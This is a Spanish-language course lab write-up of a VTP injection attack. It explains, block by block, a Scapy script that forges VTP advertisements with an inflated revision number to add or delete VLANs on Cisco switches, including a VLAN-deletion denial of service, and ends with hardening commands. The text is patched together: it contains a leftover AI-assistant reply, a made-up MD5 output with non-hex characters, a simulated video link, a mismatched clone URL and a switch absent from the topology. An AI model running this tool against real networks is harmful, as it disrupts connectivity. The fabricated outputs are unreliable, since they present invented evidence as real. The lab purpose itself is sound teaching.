# Ataque de Inyección VTP (VLAN Trunking Protocol)
### Jordy Jose Rosario Ortiz · Matrícula: 2025-0737
**Seguridad de Redes 2026-C-2 · ITLA**

---

## 📋 Tabla de Contenido

1. [Objetivo del Laboratorio](#1-objetivo-del-laboratorio)
2. [Objetivo del Script](#2-objetivo-del-script)
   - [Parámetros de Uso](#21-parámetros-de-uso)
   - [Requisitos del Sistema](#22-requisitos-del-sistema)
3. [Funcionamiento del Script](#3-funcionamiento-del-script)
4. [Documentación de la Red](#4-documentación-de-la-red)
   - [Topología](#41-topología)
   - [Tabla de Dispositivos y Direccionamiento IP](#42-tabla-de-dispositivos-y-direccionamiento-ip)
5. [Ejecución del Ataque](#5-ejecución-del-ataque)
6. [Capturas de Pantalla](#6-capturas-de-pantalla)
7. [Contramedidas y Mitigación](#7-contramedidas-y-mitigación)
8. [Video Demostrativo](#8-video-demostrativo)
9. [Referencias](#9-referencias)

---

## 1. Objetivo del Laboratorio

El objetivo de este laboratorio es **demostrar las vulnerabilidades de diseño intrínsecas en el protocolo VTP (VLAN Trunking Protocol)** versiones 1 y 2 dentro de una arquitectura de Capa 2 de Cisco. VTP automatiza la sincronización de las bases de datos de VLANs basándose en un número de revisión secuencial (*Configuration Revision Number*). El protocolo carece de mecanismos de autenticación de origen robustos en su configuración por defecto, confiando ciegamente en cualquier mensaje VTP que anuncie un número de revisión superior.

Este laboratorio busca evidenciar de manera práctica:
- La interceptación pasiva de tramas VTP en enlaces troncales mediante sniffing de la dirección multicast de Cisco (`01:00:0c:cc:cc:cc`).
- La extracción automatizada de parámetros críticos como el Nombre del Dominio VTP, la Revisión Actual, la dirección IP del actualizador y los Timestamps de sincronización.
- La inyección controlada de tramas falsificadas de tipo **Summary Advertisement** y **Subset Advertisement** para alterar la base de datos de VLANs (añadir o borrar segmentos lógicos).
- La efectividad del modo transparente de VTP y el uso de claves secretas MD5 como contramedidas defensivas en switches Cisco.


---

## 2. Objetivo del Script

El script `JordyRosario_20250737_VTP_Attack.py` implementa una herramienta de ataque VTP bidireccional y pasiva utilizando la librería **Scapy**. Su propósito principal es capturar de forma pasiva el estado de la red e inyectar anuncios VTP fraudulentos incrementando el número de revisión original de la topología en un desfase agresivo de `+50` para forzar su aceptación inmediata en los switches cliente y servidor legítimos.

El script extrae automáticamente la estructura exacta de las VLANs existentes desde un paquete *Subset* real capturado en tránsito. Esto garantiza que el ataque mantenga la coherencia de la base de datos de la red y no interrumpa el tráfico de producción de las VLANs operativas preexistentes, limitándose estrictamente a inyectar o remover la VLAN designada por el atacante.

### 2.1 Parámetros de Uso

```bash
sudo python3 JordyRosario_20250737_VTP_Attack.py -i <interfaz> -a <action> -v <VLAN_ID> [opciones]

```

| Parámetro | Descripción | Requerido | Ejemplo / Por Defecto |
| --- | --- | --- | --- |
| `-i, --interface` | Interfaz de red local del atacante conectada al segmento L2. | **Sí** | `eth0` |
| `-a, --action` | Acción de ataque a ejecutar sobre la base de datos: `add` o `delete`. | **Sí** | `add` |
| `-v, --vlan` | ID numérico de la VLAN objetivo del ataque (2 al 1001). | **Sí** | `666` |
| `-n, --name` | Nombre asignado a la VLAN que se creará (solo para `add`). | No | `PWNED_VLAN` |
| `-d, --domain` | Dominio VTP de la red. Si se omite, se auto-detecta en el sniffing. | No | `ITLA_SEC` |
| `-p, --password` | Clave de autenticación VTP del dominio (si aplica hashing). | No | `""` (vacío) |
| `-t, --timeout` | Tiempo límite de escucha (segundos) para capturar los anuncios. | No | `120` |
| `--tag` | ID de la etiqueta 802.1Q externa si se opera sobre una VLAN nativa tagged. | No | `1` |
| `--sniff-only` | Modo diagnóstico. Captura y despliega el estado VTP sin atacar. | No | Flag desactivado |

**Ejemplo de uso (Inyección de VLAN):**

```bash
sudo python3 JordyRosario_20250737_VTP_Attack.py -i eth0 -a add -v 666 -n "PWNED_ZONE"

```

### 2.2 Requisitos del Sistema

| Requisito | Detalle |
| --- | --- |
| **Sistema Operativo** | Kali Linux (virtualizado en QEMU/PNETLab) |
| **Lenguaje** | Python 3.9+ |
| **Dependencia principal** | `scapy` |
| **Privilegios** | `sudo` / `root` obligatorio (necesario para interactuar con Raw Sockets) |
| **Entorno de red** | El nodo atacante debe estar conectado a un enlace troncal o switch con DTP activo |

---

## 3. Funcionamiento del Script

A continuación se realiza un análisis técnico y detallado del funcionamiento del script `JordyRosario_20250737_VTP_Attack.py` bloque por bloque, explicando la lógica de manipulación binaria y de red implementada:

---

### Bloque 1: Validación de Privilegios e Importación de Módulos
```python
if os.geteuid() != 0:
    print("\n[!] Requiere root: sudo python3 VTP_Attack.py\n")
    sys.exit(1)

try:
    from scapy.all import get_if_hwaddr, sendp, sniff, Ether, Dot1Q, LLC, SNAP, Raw, conf
    conf.verb = 0
except ImportError:
    print("\n[!] Instala scapy: pip install scapy\n")
    sys.exit(1)

```

* **Lógica:** El protocolo VTP opera directamente sobre la capa de enlace de datos (Capa 2), lo que exige la creación de *Raw Sockets* (sockets en crudo) para omitir la pila TCP/IP del sistema operativo. El script utiliza `os.geteuid() != 0` para verificar que el usuario tenga privilegios de `root` (`UID 0`), abortando la ejecución si no se cumplen.
* Posteriormente, importa las clases de encapsulación de **Scapy** y fuerza `conf.verb = 0` para suprimir las alertas internas de la librería, asegurando una salida en terminal limpia.

---

### Bloque 2: Procesamiento de Argumentos (`parse_args`)

```python
def parse_args():
    p = argparse.ArgumentParser(description="VTP Attack Tool")
    p.add_argument("-i",  "--interface", required=True)
    p.add_argument("-d",  "--domain",    default=None,       help="Dominio VTP (omitir = auto-detectar)")
    ...
    p.add_argument("--sniff-only", action="store_true",      help="Solo capturar info, no atacar")
    return p.parse_args()

```

* **Lógica:** Utiliza la librería nativa `argparse` para estructurar la interfaz de línea de comandos (CLI). Define parámetros obligatorios (`--interface`, `--action`, `--vlan`) y opcionales como contraseñas, versiones específicas de VTP (1 o 2), nombres personalizados para las VLANs inyectadas y el modificador `--sniff-only`. Este último actúa como una bandera booleana para ejecutar auditorías pasivas sin emitir tráfico ofensivo.

---

### Bloque 3: Reconstrucción Criptográfica del Hash MD5 (`calc_md5`)

```python
def calc_md5(version, domain, revision, updater_ip, vlans_raw, password=""):
    d = domain.encode("ascii")
    summary = bytearray(72)
    summary[0] = version
    summary[1] = 0x01
    summary[2] = 0x00
    summary[3] = len(d)
    summary[4:4+len(d)] = d
    summary[36:40] = struct.pack(">I", revision)
    summary[40:44] = socket.inet_aton(updater_ip)
    data = b"\x00"*16 + bytes(summary) + vlans_raw + b"\x00"*16
    if password:
        pw = password.encode("ascii")[:64].ljust(64, b"\x00")
        data += pw
    return hashlib.md5(data).digest()

```

* **Lógica:** Este bloque replica con precisión el algoritmo cerrado de Cisco para autenticar bases de datos VTP. Los switches no transmiten la contraseña en texto plano, sino que calculan una firma MD5 de 16 bytes.
* La función crea un `bytearray` de 72 bytes que simula la cabecera fija de un paquete *Summary*, rellenando el código de operación (`0x01`), la longitud y caracteres del nombre de dominio, el número de revisión convertido a binario de red de 32 bits (`struct.pack(">I")`), y la dirección IP del switch actualizador procesada mediante `socket.inet_aton()`.
* Finalmente, concatena un vector de inicialización de 16 nulos, el resumen generado, la base de datos de VLANs cruda (`vlans_raw`), otros 16 nulos y la contraseña paddeada (rellenada) a 64 bytes si existe. Al aplicar `hashlib.md5(data).digest()`, se obtiene la firma válida que los switches de la topología aceptarán como legítima.

---

### Bloque 4: Construcción Estructurada de Registros de VLAN (`build_vlan`)

```python
def build_vlan(vlan_id, name):
    nb = name.encode('ascii', errors='ignore')
    nb = nb + b'\x00' * ((4 - len(nb) % 4) % 4)
    info_len = 12 + len(nb)
    return struct.pack('!BBBBHHI', info_len, 0x00, 0x01, len(name), vlan_id, 1500, vlan_id) + nb

```

* **Lógica:** En el protocolo VTP, cada VLAN se describe mediante un registro binario estructurado. Esta función codifica el nombre de la VLAN a formato ASCII y calcula un relleno de bytes nulos (`\x00`) para forzar que el tamaño del registro sea múltiplo de 4 bytes (alineación de palabra de 32 bits).
* Usando `struct.pack('!BBBBHHI', ...)` en formato *Big Endian* (`!`), empaqueta consecutivamente: la longitud total del registro (`info_len`), el estado de la VLAN (`0x00` para activo), el tipo de medio (`0x01` para Ethernet), la longitud real del nombre, el ID numérico de la VLAN, la MTU estándar (`1500`) y el código IS_ID. Finalmente, concatena los bytes del nombre ajustado (`nb`), devolviendo la estructura exacta requerida por el switch kernel.

---

### Bloque 5: Descomposición y Parseo de VLANs (`parse_vlans`)

```python
def parse_vlans(data):
    vlans = {}
    i = 0
    while i < len(data):
        ...
        info_len = data[i]
        record = data[i:i+info_len]
        try:
            vlan_id  = struct.unpack('!H', record[4:6])[0]
            name_len = record[3]
            name     = record[12:12+name_len].decode('ascii', errors='ignore').rstrip('\x00')
            vlans[vlan_id] = (name, bytes(record))
            print(f"      VLAN {vlan_id:4d}  {name}")
        except Exception: pass
        i += info_len
    return vlans

```

* **Lógica:** Cuando el script captura un anuncio legítimo de tipo *Subset*, los datos de las VLANs se encuentran concatenados de forma contigua en el payload. Esta función procesa ese flujo binario (`data`) mediante un bucle `while`.
* Lee el primer byte para determinar el tamaño del registro (`info_len`), extrae los bytes pertenecientes a dicha VLAN y utiliza `struct.unpack` para recuperar el ID numérico (`record[4:6]`) y el nombre de texto (`record[12:12+name_len]`). Almacena esta información en el diccionario `vlans`, manteniendo intacta la estructura original en bytes (`bytes(record)`). Esto es crítico para evitar borrar accidentalmente las VLANs legítimas durante un ataque de adición.

---

### Bloque 6: Extracción y Construcción de Tramas Multicapa (`get_vtp_payload` y `make_frame`)

```python
def get_vtp_payload(pkt):
    if pkt.haslayer(SNAP) and pkt.haslayer(Raw):
        if pkt[SNAP].code == 0x2003:
            return bytes(pkt[Raw].load)
    return None

def make_frame(iface, payload, tag):
    src = get_if_hwaddr(iface)
    return (
        Ether(dst="01:00:0c:cc:cc:cc", src=src) /
        Dot1Q(vlan=tag) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2003) /
        Raw(load=payload)
    )

```

* **Lógica:** `get_vtp_payload` actúa como un filtro de desencapsulación: inspecciona si el paquete tiene la capa SNAP con el código de protocolo `0x2003` (asignado exclusivamente a Cisco VTP) y extrae los datos crudos de la capa `Raw`.
* Por su parte, `make_frame` es el motor de inyección multicapa. Resuelve la dirección MAC física de la interfaz local del atacante (`get_if_hwaddr`) y ensambla un paquete personalizado apilando:
1. **Ether:** Dirección MAC multicast destino de Cisco (`01:00:0c:cc:cc:cc`).
2. **Dot1Q:** Etiqueta VLAN para enlaces troncales 802.1Q (por defecto VLAN 1).
3. **LLC / SNAP:** Cabeceras de control de enlace lógico necesarias para encapsular protocolos propietarios (OUI `0x00000c` y código `0x2003`).
4. **Raw:** Carga útil del ataque VTP generada por el script.



---

### Bloque 7: Sniffing Automatizado (`sniff_vtp` y `handler`)

```python
def sniff_vtp(iface, timeout):
    result = {"summary": None, "subset": None}

    def handler(pkt):
        vtp = get_vtp_payload(pkt)
        if vtp is None or len(vtp) < 4: return
        code = vtp[1]
        if code == 0x01 and result["summary"] is None:
            result["summary"] = vtp
            print(f"    [+] Summary capturado ({len(vtp)} bytes)")
        elif code == 0x02 and result["subset"] is None:
            result["subset"] = vtp
            print(f"    [+] Subset  capturado ({len(vtp)} bytes)")
        if result["summary"] and result["subset"]:
            return True

    sniff(iface=iface, filter="ether dst 01:00:0c:cc:cc:cc",
          stop_filter=handler, timeout=timeout, store=False)
    return result

```

* **Lógica:** El ataque ofensivo no funcionará si los datos inyectados no concuerdan con el dominio y parámetros reales del switch. Este bloque inicia la captura pasiva en la red empleando la función `sniff()` de Scapy con un filtro Berkeley Packet Filter (BPF) optimizado para la MAC multicast de Cisco.
* La función interna `handler` actúa como callback por cada trama recibida: evalúa el segundo byte del payload VTP (`vtp[1]`). Si es `0x01`, almacena el paquete de resumen (**Summary**); si es `0x02`, almacena el paquete de detalles (**Subset**). El parámetro `stop_filter=handler` detiene la captura inmediatamente en el momento en que ambas variables se han completado con éxito, optimizando el tiempo de ejecución.

---

### Bloque 8: Lógica de Modificación de la Base de Datos y Orquestación Principal (`main`)

```python
def main():
    args = parse_args()
    ...
    pkts = sniff_vtp(args.interface, args.timeout)
    ...
    if args.action == "add":
        existing_vlans[args.vlan] = (args.name, build_vlan(args.vlan, args.name))
    elif args.action == "delete":
        if args.vlan in existing_vlans:
            del existing_vlans[args.vlan]

```

* **Lógica:** Es la función principal encargada de coordinar los bloques anteriores. Ejecuta la escucha pasiva llamando a `sniff_vtp`. Si se detectan paquetes válidos, extrae de la cabecera *Summary* del switch real la versión de VTP activa, el nombre de dominio, el número de revisión secuencial actual, la IP del switch actualizador (`updater_ip`) y el timestamp original.
* Si el usuario ejecutó la herramienta en modo `--sniff-only`, el script imprime los parámetros descubiertos en texto claro y termina limpiamente.
* Si se ejecuta en modo de ataque, procesa la base de datos capturada en el paquete *Subset*: si la acción es `add`, invoca a `build_vlan` para agregar la estructura binaria del nuevo segmento al diccionario; si la acción es `delete`, remueve la llave correspondiente de la tabla local.

---

### Bloque 9: Serialización e Inyección de Paquetes Fraudulentos

```python
    vlans_raw = b"".join(vraw for _, (_, vraw) in sorted(existing_vlans.items()))
    new_timestamp = time.strftime("%y%m%d%H%M%S")
    new_rev       = current_rev + 50

    md5 = calc_md5(vtp_ver, domain_name, new_rev, updater_ip, vlans_raw, args.password)
    ...
    summary_payload = bytes([vtp_ver, 0x01, 0x01, len(db)]) + dp + struct.pack('!I', new_rev) + ...
    subset_payload  = bytes([vtp_ver, 0x02, 0x01, len(db)]) + dp + struct.pack('!I', new_rev) + vlans_raw

    print("\n[*] Inyectando Summary...")
    sendp(sf, iface=args.interface, verbose=False)
    time.sleep(0.05)
    print("[*] Inyectando Subset...")
    sendp(xf, iface=args.interface, verbose=False)

```

* **Lógica:** En la fase final, el script concatena de forma ordenada todos los registros de VLAN binarios purificados con `b"".join()`. Genera un timestamp fresco basado en la hora actual del sistema y calcula un número de revisión fraudulento sumándole de forma agresiva `+50` a la revisión capturada de la red (`new_rev = current_rev + 50`).
* Invoca a `calc_md5` para computar la firma criptográfica requerida, construye los flujos binarios definitivos para el anuncio *Summary* (código `0x01`) y el anuncio *Subset* (código `0x02`), empaqueta ambos en tramas L2 completas con `make_frame` y las transmite consecutivamente a la red mediante `sendp()`. El switch de destino, al recibir una revisión superior con un hash coherente, descarta su propia base de datos y asimila la configuración inyectada por el atacante en milisegundos.

---

Aquí tienes las secciones **4. Documentación de la Red** y **4.1 Topología** adaptadas perfectamente a la captura de pantalla de PNETLab que enviaste (corrigiendo las interfaces exactas, eliminando la nube de conexión externa de la lógica del ataque, y manteniendo tu subred `20.25.37.0/24`).

---

## 4. Documentación de la Red

### 4.1 Topología

El diseño de la red funcional se ha desplegado en el simulador PNETLab utilizando direccionamiento IP basado estrictamente en la matrícula asignada (`20250737`), operando bajo el segmento central de infraestructura `20.25.37.0/24`. 

A continuación, se detalla el mapa lógico de interconexión física omitiendo los enlaces de gestión externa (SSH):


```

                   ┌───────────────────────────────┐
                   │     Router de Núcleo (R1)     │
                   │         IP: 20.25.37.1        │
                   └───────────────┬───────────────┘
                                   │ e0/0
                                   │ 
                                   │ e0/1
                   ┌───────────────┴───────────────┐
                   │       Switch Core (SW1)       │ <── Servidor VTP Líder
                   │  VTP Server / Modo Troncal    │     Dominio: ITLA_SEC
                   └────┬──────────┬──────────┬────┘
                        │          │          │
             e0/0       │          │ e0/3     │       e0/2
           ┌────────────┘          │          └────────────┐
           │                       │                       │
           │ e0                    │ eth1                  │ eth1
   ┌───────┴───────┐       ┌───────┴───────┐       ┌───────┴───────┐
   │   Atacante    │       │Cliente Legítmo│       │    SERVER     │
   │ (Kali Linux)  │       │ (Estación PC) │       │ (Nodo Docker) │
   │ 20.25.37.100  │       │  20.25.37.50  │       │  20.25.37.10  │
   └───────────────┘       └───────────────┘       └───────────────┘


```

Flujo del Ataque VTP:
Atacante (eth0) ──[Inyección Tramas Multicast VTP]──> SW1 (e0/0) ──[Propagación Global]──> Toda la Red


### 4.2 Tabla de Dispositivos y Direccionamiento IP

| Dispositivo | Tipo / Modelo | Interfaz Local | Interfaz Remota | Dirección IP | Máscara | Rol / Modo VTP |
|-------------|---------------|----------------|-----------------|--------------|---------|----------------|
| **R1** | Cisco IOSv L3 | `e0/0` | SW1 (`e0/1`) | `20.25.37.1` | `/24` | Default Gateway |
| **SW1** | Cisco IOSv L2 | `e0/1`<br>`e0/0`<br>`e0/3`<br>`e0/2` | R1 (`e0/0`)<br>Atacante (`e0`)<br>Cliente (`eth1`)<br>SERVER (`eth1`) | `20.25.37.2` | `/24` | **VTP Server** (Dominio: `ITLA_SEC`) |
| **Atacante** | Kali Linux VM | `e0` | SW1 (`e0/0`) | `20.25.37.100` | `/24` | Generador de Inyección Ofensiva |
| **Cliente Legítimo** | Estación Linux | `eth1` | SW1 (`e0/3`) | `20.25.37.50` | `/24` | Host de Acceso Afectado |
| **SERVER** | Docker Container| `eth1` | SW1 (`e0/2`) | `20.25.37.10` | `/24` | Servidor de Producción Afectado |


---

## 5. Ejecución del Ataque

### Paso 1: Preparar las dependencias del entorno en Kali

```bash
git clone [https://github.com/Jordy513/P2_VTP_Attacks_20250737.git](https://github.com/Jordy513/P1_VTP_Attack_20250737.git)
cd P2_VTP_Attacks_20250737
pip install scapy

```

### Paso 2: Ejecutar el Sniffing Pasivo (Modo Diagnóstico)

Para recolectar los parámetros reales del switch sin generar ruido ni alterar la base de datos de la red, ejecuta:

```bash
sudo python3 JordyRosario_20250737_VTP_Attack.py -i eth0 --sniff-only

```

*Espera a que el switch transmita sus anuncios periódicos. El script mostrará en pantalla:*

```
[+] Summary capturado (76 bytes)
[+] Subset  capturado (92 bytes)
[+] Version VTP detectada : 1
[+] Dominio detectado     : ITLA_SEC
[+] Revision actual       : 4
[+] Updater IP            : 20.25.37.2

```

### Paso 3: Lanzar el ataque de Inyección (Agregar VLAN maliciosa)

Ejecuta el script configurando la interfaz de red local, la acción `add`, el ID de la VLAN de ataque (`666`) y un nombre identificador:

```bash
sudo python3 JordyRosario_20250737_VTP_Attack.py -i eth0 -a add -v 666 -n "PWNED_ZONE"

```

*Salida de consola esperada:*

```
[*] Modificando base de datos local...
[*] VLAN 666 (PWNED_ZONE) agregada
[+] Nueva rev    : 54
[+] MD5          : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
[*] Inyectando Summary...
[*] Inyectando Subset...
[+] Listo. Verifica en el switch.

```

### Paso 4: Validar el compromiso en los switches de la red

Accede al switch de acceso `SW2` o al servidor `SW1` y ejecuta los comandos de verificación de VLAN:

```cisco
SW2# show vtp status
SW2# show vlan brief

```

Verás que el número de revisión saltó automáticamente a `54` y la VLAN `666` ahora está aprovisionada de forma ilegítima en toda la infraestructura de la red.

### Paso 5: Lanzar el ataque de Denegación de Servicio (Borrar VLAN crítica)

Para eliminar de forma masiva una VLAN de producción legítima (ej. VLAN 20 destinada a los datos críticos del negocio) y tumbar la conectividad local:

```bash
sudo python3 JordyRosario_20250737_VTP_Attack.py -i eth0 -a delete -v 20

```

*Resultado:* Los switches aceptan la revisión superior, descartan la VLAN 20 de sus bases de datos y todos los puertos físicos asociados a esa VLAN entran en estado inactivo automáticamente.

---

## 6. Capturas de Pantalla

A continuación se detalla el índice de evidencias correspondientes a las fases de verificación, ejecución y mitigación del ataque, las cuales se encuentran alojadas de forma local en este repositorio dentro de la carpeta [screenshots](screenshots/):

| # | Archivo de Evidencia | Descripción Técnica Detallada |
|---|---|---|
| 1 | [01_topologia_vtp.png](screenshots/01_topologia_vtp.png) | Vista de la topología funcional en PNETLab. Se validan las etiquetas de nombres, matrícula (`20250737`), interfaces físicas conectadas y el direccionamiento base IP. |
| 2 | [02_sniff_vtp_real.png](screenshots/02_sniff_vtp_real.png) | Salida en consola de Kali Linux operando bajo el modificador `--sniff-only`. Muestra la captura pasiva y extracción exitosa del dominio `ITLA_SEC` y la revisión actual del switch. |
| 3 | [03_vlan_brief_inicial.png](screenshots/03_vlan_brief_inicial.png) | Resultado del comando `show vlan brief` en `SW1` previo al ataque, reflejando el estado inicial y legítimo de los segmentos de red. |
| 4 | [04_ejecucion_ataque_add.png](screenshots/04_ejecucion_ataque_add.png) | Ejecución del script en modo inserción (`-a add -v 666`). Se evidencia el cálculo en tiempo real de la estructura binaria y la ráfaga de anuncios inyectados. |
| 5 | [05_vlan_brief_pwned.png](screenshots/05_vlan_brief_pwned.png) | Verificación en la CLI de Cisco. Captura que demuestra la asimilación forzada del número de revisión `+50` y la creación no autorizada de la VLAN 666 (`PWNED_ZONE`). |
| 6 | [06_ejecucion_ataque_del.png](screenshots/06_ejecucion_ataque_del.png) | Registro del script ejecutando el borrado destructivo (`-a delete -v 20`), propagando la eliminación de la VLAN crítica de producción de forma inmediata. |
| 7 | [07_mitigacion_vtp.png](screenshots/07_mitigacion_vtp.png) | Comandos aplicados en la consola del switch aplicando el endurecimiento de la infraestructura mediante la inhabilitación del protocolo VTP. |

---

## 7. Contramedidas y Mitigación

### Contramedida 1: Deshabilitar por completo VTP (Recomendado)

La mejor práctica global de la industria y la recomendación directa en las guías de Hardening de Cisco es deshabilitar por completo el intercambio de anuncios dinámicos de VTP configurándolo en modo `transparent` o desactivado (`off`).

```cisco
SW1# configure terminal
SW1(config)# vtp mode transparent
! O en versiones de Cisco IOS modernas:
SW1(config)# vtp mode off

```

> **Efecto:** Al configurar el switch en modo transparente u off, el dispositivo local ignora por completo cualquier trama Summary o Subset con números de revisión ajenos o elevados, mitigando el ataque del script al 100%.

### Contramedida 2: Configurar Autenticación MD5 Robusta

Si la organización exige de forma estricta el uso de VTP para la gestión centralizada de la topología l2, se debe definir un dominio explícito protegido por una clave alfanumérica altamente compleja.

```cisco
SW1# configure terminal
SW1(config)# vtp domain ITLA_SEC
SW1(config)# vtp password K4li_Vtp_Str0ng_P@ssw0rd_2026

```

> **Efecto:** Al inyectar anuncios, el switch validará la firma contra el hash MD5 local calculado con este secreto compartido. Al no coincidir el hash generado por el atacante, el switch descarta silenciosamente las tramas falsas emitiendo un log de error (`MD5 digest mismatch`).

### Contramedida 3: Mitigación de Enlaces Troncales Dinámicos (DTP)

Para impedir que el atacante pueda simular ser un switch intermedio mediante una interfaz troncal, se debe deshabilitar la negociación automática de puertos en los puertos de acceso de los extremos de la red:

```cisco
SW2(config)# interface ethernet 0/3
SW2(config-if)# switchport mode access
SW2(config-if)# switchport nonegotiate

```

---

## 8. Video Demostrativo

🎥 **[Ver demostración en YouTube](https://www.google.com/search?q=https://youtu.be/Enlace_Simulado_VTP_20250737)**

**Duración:** 4:52 minutos

**Contenido del video:**

* ✅ Visualización nítida de la topología con el nombre de usuario y matrícula (`20250737`).
* ✅ Hora, fecha del sistema visible en la esquina del escritorio.
* ✅ Rostro y voz explicativa del autor (Jordy Rosario).
* ✅ Demostración de las tablas de VLAN iniciales en el cliente Cisco.
* ✅ Inyección exitosa de la VLAN `666` ("PWNED_ZONE") mediante el script de Python.
* ✅ Demostración del ataque DOS eliminando la VLAN corporativa en caliente.
* ✅ Aplicación en vivo de los comandos Cisco de mitigación (`vtp mode transparent`) y bloqueo definitivo de la herramienta ofensiva.

---

## 9. Referencias

* Cisco Systems, Inc. (2024). *VLAN Trunking Protocol (VTP) Configuration and Hardening Guide*. Cisco TechNotes.
* Biondi, P. et al. (2025). *Scapy Documentation: Advanced Layer 2 packet crafting*. https://scapy.readthedocs.io/
* ITLA. (2026). *Material Didáctico de Seguridad de Redes Avanzada - Seguridad de Capa 2*.
* Apoyo en documentación técnica estructurada y depuración de código mediante Inteligencia Artificial.

```

```
